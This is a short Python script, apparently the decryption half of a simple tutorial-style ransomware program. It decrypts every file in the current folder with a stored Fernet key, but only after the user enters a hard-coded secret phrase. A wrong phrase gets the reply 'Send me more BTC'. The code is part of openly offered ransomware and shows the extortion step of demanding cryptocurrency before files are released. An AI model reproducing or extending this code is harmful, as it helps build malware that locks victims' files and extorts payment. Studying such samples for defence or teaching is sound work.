#!/usr/bin/env python3

import os
from cryptography.fernet import Fernet


# Find some files in dir
files = []

for file in os.listdir():
    if file == "encrypt.py" or file == "thekey.key" or file == "decrypt.py":
        continue
    if os.path.isfile(file):
        files.append(file)


# Decrypt the file
key = Fernet.generate_key()

with open("thekey.key", "rb") as key:
    secretkey = key.read()

secret_phrase = "pokemon"
user_phrase = input("Enter the secret phrase to decrypt your files\n")

if user_phrase == secret_phrase:
    for file in files:
        with open(file, "rb") as thefile:
            contents = thefile.read()
        contents_decrypted = Fernet(secretkey).decrypt(contents)
        with open(file, "wb") as thefile:
            thefile.write(contents_decrypted)
    print("congrats, your files are decrypted.")
else:
    print("Wrong secret phrase. Send me more BTC")
